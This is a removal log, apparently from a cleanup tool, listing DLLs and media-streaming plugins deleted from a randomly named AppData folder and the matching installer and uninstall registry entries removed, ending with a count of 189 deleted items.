+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-synch-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-synch-l1-2-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-string-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-runtime-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-private-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-process-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-convert-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-profile-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-sysinfo-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-multibyte-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-timezone-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-filesystem-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-core-rtlsupport-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\api-ms-win-crt-environment-l1-1-0.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_es_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_rtp_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_smem_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_stats_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_cycle_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_dummy_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_setid_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_delay_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_bridge_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_record_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_gather_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_autodel_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_display_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_standard_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_transcode_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_duplicate_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_chromecast_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_description_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_chromaprint_plugin.dll
+  [File] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out\libstream_out_mosaic_bridge_plugin.dll
+  [Directory] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app\stream_out
+  [Directory] c:\users\Redacted\appdata\roaming\tioao wesah\niwp app
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{70995719-AA9F-40B3-85E9-C46CB738DAAF}\UninstallString
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UpgradeCodes\F0E135F81A0A49646BC2A4153F917384\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\0556755033264C34D9D9BA11BB1E0E5E\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\0793AB257D9BE4A4496EBCBE77344177\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\09CEDD37120E81A468E708F23D436DAD\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\0E1DBBDC63E812D469CD0B3B44B79813\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\0F889C2896A8A8747B2D6B687B8FBA62\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\15246FD887A4877489F84F0F73AE122C\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1850CF546DFD0D3438A389643E51EC37\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\18A76D84CA04F3D4EAD635038AD33245\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\18F85C434FB5B13439B2EF58E1346F0C\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1AFAF7B5D0D0BAC40964A7D9DB9F4DD0\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1B4B763F17FA9D246BA98E72C1084C37\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1E23925FBF0C0384785351CE8FE5BEC3\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\1F240252A79BECC4FB01E252EC66C353\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\2109DB1DA4E16B244B270748C8C43AC0\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\24020A892A469D84C9A372D44AB1ADFB\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\251D3209D9CBDC942A2BC439D33ACECE\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\25BFDFC850840CB4381BA06E0FFBF8B4\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\26842FBE0FAB6BA4BACFB1D6E583137D\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\2D70F4D12D156684A9D9D8724A598B66\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\2E4795990073AB440BB6C6F57DEAD0BA\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\3234EAF45B31CE748B097BACAD0DEB3C\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\3E3636B2B7C328D46ACE988AF07FEB78\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\424156D1A73CBD74C9DACF6E9371528F\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\4320AB981DCE03544801ED418AC2A9A6\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\4626984ED7F3B6344A68E5928829E076\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\578EA9D5186E56D429DF13DAFE553513\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\5916E8B659C179941904EDAE0AFBD7D1\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\5A03551116EBB8E44ABA9090327604C7\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\5F24C1F5EC3A19848B0DCF0C0FE7D2A1\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\69C569D79CA614D43A453076B07E9CD6\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\6A1C1463346DA284D84148F8BDE33B6C\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\6B08689E3A73C3F49A9318851D17670C\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\6CF8B66E0389CD347BF911452331C4CE\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\6EF7EF0C0C043D54FACE782DA7FE8D7A\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\779C196EA1761B543BD42985BB73B140\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\7CC3E8CA514862340BB5B59FEDCB939B\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\846EB590FBEC86E47AA6673ADE50C7C9\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\857DF55D255CE4D42A284C6582BE73BF\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\8862B1F7442771A498D70CCA9F1C0732\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\8B8DBA77F4D2A4943A9E94AA53849A9B\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\959CE1C30FA3E3F489271384E9FA017F\91759907F9AA3B04589E4CC67B83ADFA
+
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\9955BAEA86366284492BBD14C0CA7540\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\9C59E2B7DD253084B9EE5A915A2B0BFA\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\9FCC759CD560D744D843B85CEDC3FE7F\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\A3F338C4CFB240D45BA87F17AB2388A1\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\A7AC97D32ED61FF46A1AAFCD6738A4CB\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\AE7D5C46917892F4F8B80770F775155E\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\AEE7EABB7D62F5E4F84DF38825D6D39B\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\AF101477B6524CC42B7C5D4819EBA43F\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\B25D7F4205C76E34F9DA5AF3472E23C3\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\B78229F0B582A7B458B02531868C9DDF\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\BC4FDA02CA3EB6248A015A216F950E93\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\C0BC157DFEBCB2A429CDB3B279FA13FA\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\C4890170E11986445A512DF2E8C5ACF3\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\C4B5677022BFA2A43916814D135AB196\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\C4E03DBC55A51534AB979CEB3DE90516\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\CC772DFB05A714441B2ACDFC1580155D\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\D020B29468DD70B45AAA4766DF12A057\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\D239F915D1C65404AA1FA7801CEDCC15\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\D373BEF2F55F5934D9E4212E04C58DB6\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\DD2527F4B4565B649B70348502C3520D\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\E0B413AB07149DA48A07C934074DF1DA\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\E5DCF43EC19438D4E88E6EDA25C8E295\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\ECBAA78B077F33B4AA3DF3A7BDB2A3B1\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\EED6ECF1469DE054BAFBC922DBF94EE3\91759907F9AA3B04589E4CC67B83ADFA
+  [RegValue] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Components\F96E5E6976E687B4EAA970C84D385AF1\91759907F9AA3B04589E4CC67B83ADFA
+  [RegKey] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\InstallProperties
+  [RegKey] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\Features
+  [RegKey] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\Patches
+  [RegKey] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA\Usage
+  [RegKey] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-21-1633198216-3867796787-3087809761-1001\Products\91759907F9AA3B04589E4CC67B83ADFA
+  [RegKey] HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{70995719-AA9F-40B3-85E9-C46CB738DAAF}
+
+Removal summary: Deleted=189 Scheduled=0 Failed=0
